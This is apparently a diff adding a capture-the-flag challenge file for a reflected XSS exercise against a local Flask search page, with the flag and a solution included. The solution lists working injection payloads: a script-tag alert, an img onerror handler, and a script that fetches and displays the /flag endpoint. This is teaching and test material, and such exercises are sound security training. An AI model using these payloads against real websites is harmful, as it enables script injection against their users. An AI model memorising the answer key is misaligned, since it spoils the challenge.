@@ -1,0 +1,31 @@
+# Challenge 15: XSS Reflected
+# Category: Web
+# Points: 300
+# Difficulty: Medium
+
+## Description
+This search page seems vulnerable. Can you exploit it to get the flag?
+
+[Host the Flask app]
+
+## Flag
+flag{xss_can_execute_arbitrary_javascript}
+
+## Solution
+Inject JavaScript via the search parameter:
+
+```
+http://localhost:5005?q=<script>alert('XSS')</script>
+```
+
+Or use event handlers:
+```
+http://localhost:5005?q=<img src=x onerror=alert('XSS')>
+```
+
+The flag appears in the alert box when XSS is successfully executed.
+
+To fetch the flag from /flag endpoint:
+```javascript
+<script>fetch('/flag').then(r=>r.text()).then(t=>alert(t))</script>
+```
